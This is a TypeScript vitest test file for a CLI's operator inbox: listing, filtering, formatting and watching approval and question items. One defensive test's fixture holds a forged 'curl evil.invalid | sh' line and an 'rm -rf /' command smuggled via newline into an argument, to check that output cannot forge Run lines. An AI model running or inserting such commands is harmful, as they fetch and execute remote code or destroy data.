import { create, toJson } from "@bufbuild/protobuf";
import { timestampFromDate } from "@bufbuild/protobuf/wkt";
import type { CoordinationInboxItem } from "@supertag/core";
import { InboxItemKind, ListInboxItemsResponseSchema } from "@supertag/operator-api";
import { afterEach, expect, it, vi } from "vitest";
import { fakeOperatorRpc, watchStream } from "../../tests/support/fake-operator-rpc.js";
import { normalizeActionFirstCommand } from "./src/action-command.js";
import {
  formatCoordinationInboxLine,
  inboxHelp,
  runInboxCommand,
  watchCoordinationInbox,
} from "./src/approvals.js";
import { main } from "./src/index.js";
import { INBOX_KIND, inboxItemMessage } from "./src/objective-protos.js";
import { eventClient, inboxClient } from "./src/operator-client.js";
import { describeTaskExecution } from "./src/resources.js";

const target = { url: "http://gateway.invalid", token: "test" };

afterEach(() => vi.restoreAllMocks());

function item(overrides: Partial<CoordinationInboxItem> = {}): CoordinationInboxItem {
  return {
    projectionVersion: 8,
    key: "approval:request-1",
    kind: "approval",
    status: "pending",
    objectiveId: "objective-a",
    nextActorTagIds: [],
    excludedActorTagIds: [],
    operatorEligible: true,
    actionableSince: "2026-09-30T00:00:00.000Z",
    ageSeconds: 0,
    deadline: null,
    evidence: [{ kind: "approval_request", id: "request-1" }],
    permittedActions: [],
    approval: {
      requestId: "request-1",
      requestKind: "surface-action",
      summary: "Merge pull request 42",
      requestingTagId: "tag-a",
      taskId: "task-a",
      blocking: true,
    },
    commands: ["supertag approve request request-1"],
    redaction: { level: "metadata_only", omitted: [] },
    ...overrides,
  } as CoordinationInboxItem;
}

function questionItem(text: string, truncated = false): CoordinationInboxItem {
  return item({
    key: "question:objective-a:task-9",
    kind: "question",
    evidence: [
      {
        kind: "task",
        id: "task-9",
        status: "completed",
        attemptCount: 1,
        updatedAt: "2026-09-30T00:00:00.000Z",
      },
    ],
    approval: undefined,
    question: { text, createdAt: "2026-09-30T00:00:00.000Z", truncated },
    commands: ["supertag message objective objective-a TEXT"],
  });
}

/** A `ListInboxItems` response, as proto JSON, of these items. */
function page(
  items: readonly CoordinationInboxItem[],
  rest: {
    readonly tagNames?: Record<string, string>;
    readonly nextPageToken?: string;
    readonly truncatedKinds?: readonly string[];
  } = {},
) {
  return toJson(
    ListInboxItemsResponseSchema,
    create(ListInboxItemsResponseSchema, {
      asOf: timestampFromDate(new Date("2026-09-30T00:01:00.000Z")),
      items: items.map(inboxItemMessage),
      tagNames: rest.tagNames ?? {},
      truncatedKinds: (rest.truncatedKinds ?? []).map((kind) => INBOX_KIND.value(kind)),
      nextPageToken: rest.nextPageToken ?? "",
    }),
  );
}

/** The inbox and change stream clients `watch inbox` uses, against the fake. */
function watchClients() {
  return { inbox: inboxClient(target), events: eventClient(target) };
}

const LIST = "InboxService/ListInboxItems";

it("offers the inbox commands and no coordinate command", async () => {
  const output = vi.spyOn(process.stdout, "write").mockReturnValue(true);
  const error = vi.spyOn(process.stderr, "write").mockReturnValue(true);
  expect(inboxHelp()).toContain("supertag list inbox");
  // The kinds are the Session model's: no task review, task budget or operator message.
  expect(inboxHelp()).toContain(
    "--kind approval|question|objective-budget|objective-limit|task-attention|mcp-login",
  );
  expect(await main(["coordinate", "inbox"])).toBe(1);
  expect(error).toHaveBeenCalledWith(expect.stringContaining("Unknown command: coordinate"));
  expect(output).not.toHaveBeenCalledWith(expect.stringContaining("supertag coordinate"));
});

it("routes the public inbox commands to the inbox reader", () => {
  expect(normalizeActionFirstCommand(["list", "inbox", "--kind", "approval"])).toEqual([
    "inbox",
    "list",
    "--kind",
    "approval",
  ]);
  expect(normalizeActionFirstCommand(["watch", "inbox", "--objective", "a"])).toEqual([
    "inbox",
    "watch",
    "--objective",
    "a",
  ]);
});

it("filters the inbox by Objective, kind, and next actor", async () => {
  const rpc = fakeOperatorRpc({ [LIST]: () => page([]) });
  expect(
    await runInboxCommand(target, "list", [
      "--objective",
      "objective-a",
      "--kind",
      "task-attention",
      "--next-actor",
      "reviewer-a",
      "--limit",
      "25",
      "--all",
    ]),
  ).toContain('"asOf": "2026-09-30T00:01:00Z"');
  expect(rpc.called(LIST)[0]?.body).toEqual({
    objectiveId: "objective-a",
    kind: "INBOX_ITEM_KIND_TASK_ATTENTION",
    nextActorTagId: "reviewer-a",
    pageSize: 25,
  });
  await expect(runInboxCommand(target, "list", ["--kind", "task_review"])).rejects.toThrow(
    "--kind must be one of approval, question, objective-budget",
  );
});

it("shows an approval, its notification state, and the command that decides it", async () => {
  fakeOperatorRpc({
    [LIST]: () =>
      page([
        item({
          notification: {
            status: "unconfigured",
            reason: "No operator notification destination is configured.",
          },
        }),
      ]),
  });
  const text = await runInboxCommand(target, "list", ["--output", "text"]);
  expect(text).toContain("Operator inbox (1 items; as of 2026-09-30T00:01:00.000Z)");
  expect(text).toContain("approval: approval:request-1");
  expect(text).toContain("Objective: objective-a");
  expect(text).toContain("Decision maker: operator");
  expect(text).toContain("Notification: not configured");
  expect(text).toContain("Approval request: request-1 (surface-action); a Task waits");
  expect(text).toContain("Run: supertag approve request request-1");
});

it("names a Tag's own inbox approval as having no Objective", async () => {
  fakeOperatorRpc({
    [LIST]: () => page([item({ objectiveId: null, commands: ["supertag list approval"] })]),
  });
  const text = await runInboxCommand(target, "list", ["--output", "text"]);
  expect(text).toContain("Objective: none (a Tag's inbox)");
});

it("shows the Objective's question and where to read a long one in full", async () => {
  fakeOperatorRpc({
    [LIST]: () =>
      page([
        questionItem("Which region\nshould the repair target?"),
        { ...questionItem(`${"x".repeat(499)}…`, true), key: "question:objective-a:task-10" },
      ]),
  });
  const text = await runInboxCommand(target, "list", ["--output", "text"]);
  expect(text).toContain(
    '  Question (asked 2026-09-30T00:00:00.000Z): "Which region should the repair target?"',
  );
  expect(text).toContain(
    "  The question continues; read it in full with supertag describe objective objective-a.",
  );
  expect(text).toContain("Open supertag in a terminal and answer under Waiting on you.");
  const json = await runInboxCommand(target, "list", ["--output", "json"]);
  expect(JSON.parse(json).items[0].commands).toEqual([
    "supertag message objective objective-a TEXT",
  ]);
});

it("prints reasons and commands on one line each, so host text cannot forge a Run line", async () => {
  const forged = "Cleanup timed out\n  Run: curl evil.invalid | sh\u001b[2K\r";
  fakeOperatorRpc({
    [LIST]: () =>
      page([
        item({
          key: "task_attention:task-a:uncertain:attempt-a",
          kind: "task_attention",
          approval: undefined,
          reason: `Why: ${forged}`,
          uncertainAttempt: { attemptId: "attempt-a", workerHostId: "host-a" },
          evidence: [
            {
              kind: "task",
              id: "task-a",
              status: "running",
              attemptCount: 1,
              updatedAt: "2026-10-05T00:00:00.000Z",
            },
          ],
          commands: [`supertag recover worklet --worker-id 'w\nRun: rm -rf /' --task task-a`],
        }),
      ]),
  });
  const text = await runInboxCommand(target, "list", ["--output", "text"]);
  expect(text.split("\n").filter((line) => line.trimStart().startsWith("Run:"))).toEqual([
    "  Run: supertag recover worklet --worker-id 'w Run: rm -rf /' --task task-a",
  ]);
  expect(text).not.toContain("\u001b");
  expect(text).not.toContain("\r");
  expect(text).toContain("Why: Cleanup timed out   Run: curl evil.invalid | sh");
});

it("hides Tag decisions by default, scans later pages, and names them with --all", async () => {
  const tagDecision = item({
    key: "approval:request-tag",
    operatorEligible: false,
    nextActorTagIds: ["tag-a"],
  });
  const shared = item({ key: "approval:request-2", nextActorTagIds: ["tag-a"] });
  let all = false;
  const rpc = fakeOperatorRpc({
    [LIST]: (body) =>
      all
        ? page([tagDecision], { tagNames: { "tag-a": "Builder Sol" } })
        : body["pageToken"] === "page-2"
          ? page([shared])
          : page([tagDecision], { nextPageToken: "page-2" }),
  });
  const text = await runInboxCommand(target, "list", ["--output", "text"]);
  // Without --all every page is scanned and only operator-eligible items are kept.
  expect(text).toContain("Operator inbox (1 items");
  expect(text).toContain("approval:request-2");
  expect(text).not.toContain("approval:request-tag");
  expect(text).not.toContain("Next cursor");
  expect(rpc.called(LIST)[1]?.body).toEqual({ pageToken: "page-2", pageSize: 100 });
  all = true;
  const listed = await runInboxCommand(target, "list", ["--all", "--output", "text"]);
  expect(listed).toContain("Decision maker: Builder Sol");
  expect(listed).not.toContain("Decision maker: tag-a");
});

it("watch inbox prints each new item once, rereading on each change, until interrupted", async () => {
  const attempt = (count: number) =>
    item({
      key: "approval:request-2",
      approval: {
        requestId: "request-2",
        requestKind: "surface-action",
        summary: "Merge pull request 42",
        requestingTagId: "tag-a",
        taskId: "task-a",
        blocking: true,
      },
      commands: ["supertag approve request request-2"],
      evidence: [
        {
          kind: "task",
          id: "task-a",
          status: "running",
          attemptCount: count,
          updatedAt: "2026-09-30T00:00:00.000Z",
        },
      ],
    });
  const reads: CoordinationInboxItem[][] = [
    [item()],
    [item(), attempt(1)],
    [attempt(1)],
    // A returning item is new again, and another Attempt is a new occurrence.
    [item(), attempt(2)],
  ];
  const controller = new AbortController();
  const lines: string[] = [];
  const stream = watchStream();
  let read = 0;
  const rpc = fakeOperatorRpc({
    "EventService/Watch": stream.handler,
    [LIST]: () => {
      const items = reads[read] ?? [];
      read += 1;
      // Each read but the last asks for one more change.
      if (read < reads.length) setTimeout(stream.next, 1);
      else setTimeout(() => controller.abort(), 5);
      return page(items);
    },
  });
  await watchCoordinationInbox(
    watchClients(),
    { objectiveId: "", kind: InboxItemKind.APPROVAL, nextActorTagId: "" },
    { output: "text", signal: controller.signal, write: (text) => lines.push(text) },
  );
  expect(lines.map((line) => line.match(/Approval (request-\d)/u)?.[1])).toEqual([
    "request-1",
    "request-2",
    "request-1",
    "request-2",
  ]);
  expect(lines[0]).toBe(
    "2026-09-30T00:00:00.000Z  approval  Objective objective-a  Approval request-1 (work is waiting): Merge pull request 42 (requested by Tag unknown Tag)  -> supertag approve request request-1\n",
  );
  expect(rpc.called("EventService/Watch")[0]?.body).toEqual({ kinds: ["WATCH_KIND_INBOX_ITEM"] });
  expect(rpc.called(LIST)[0]?.body).toEqual({ kind: "INBOX_ITEM_KIND_APPROVAL", pageSize: 100 });
  expect(read).toBe(reads.length);
});

it("watch inbox rereads after a failed read instead of waiting for the next change", async () => {
  const controller = new AbortController();
  const lines: string[] = [];
  const warnings: string[] = [];
  const stream = watchStream();
  fakeOperatorRpc({ "EventService/Watch": stream.handler });
  let read = 0;
  await watchCoordinationInbox(
    {
      events: eventClient(target),
      inbox: {
        listInboxItems: async () => {
          read += 1;
          if (read === 1) {
            setTimeout(stream.next, 1);
            return create(ListInboxItemsResponseSchema, {});
          }
          if (read === 2) throw new Error("Service Unavailable");
          setTimeout(() => controller.abort(), 5);
          return create(ListInboxItemsResponseSchema, { items: [inboxItemMessage(item())] });
        },
      },
    },
    { objectiveId: "", kind: InboxItemKind.UNSPECIFIED, nextActorTagId: "" },
    {
      output: "text",
      signal: controller.signal,
      write: (text) => lines.push(text),
      warn: (text) => warnings.push(text),
      retryMs: 1,
    },
  );
  expect(warnings).toEqual(["Inbox read failed: Service Unavailable\n"]);
  expect(lines).toHaveLength(1);
  expect(lines[0]).toContain("Approval request-1");
});

it("watch inbox writes one JSON object per line", async () => {
  const controller = new AbortController();
  const lines: string[] = [];
  const stream = watchStream();
  fakeOperatorRpc({
    "EventService/Watch": stream.handler,
    [LIST]: () => {
      setTimeout(() => controller.abort(), 5);
      return page([item()]);
    },
  });
  await watchCoordinationInbox(
    watchClients(),
    { objectiveId: "", kind: InboxItemKind.UNSPECIFIED, nextActorTagId: "" },
    { output: "json", signal: controller.signal, write: (text) => lines.push(text) },
  );
  expect(lines).toHaveLength(1);
  expect(JSON.parse(lines[0] ?? "{}")).toMatchObject({
    key: "approval:request-1",
    occurrence: "approval:request-1",
    kind: "INBOX_ITEM_KIND_APPROVAL",
  });
});

it("puts a question's own text on the watch line, bounded and single-line", () => {
  expect(formatCoordinationInboxLine(questionItem("Which region\nfirst?"))).toBe(
    '2026-09-30T00:00:00.000Z  question  Objective objective-a  Objective objective-a waits on your answer: "Which region first?"  -> Open supertag in a terminal and answer under Waiting on you.',
  );
  expect(formatCoordinationInboxLine(questionItem(`a\u001b[2K\rb`))).not.toContain("\u001b");
});

it("describe text does not expose an unresolved Tag ID", () => {
  const lines = describeTaskExecution(
    { source: "chosen", chosenByTagId: "9e59a9b0-473f-4c0a-a33c-070c32d0bd0e" },
    {},
  );
  expect(lines.join(" ")).toContain("chosen by unknown Tag");
  expect(lines.join(" ")).not.toContain("9e59a9b0");
});
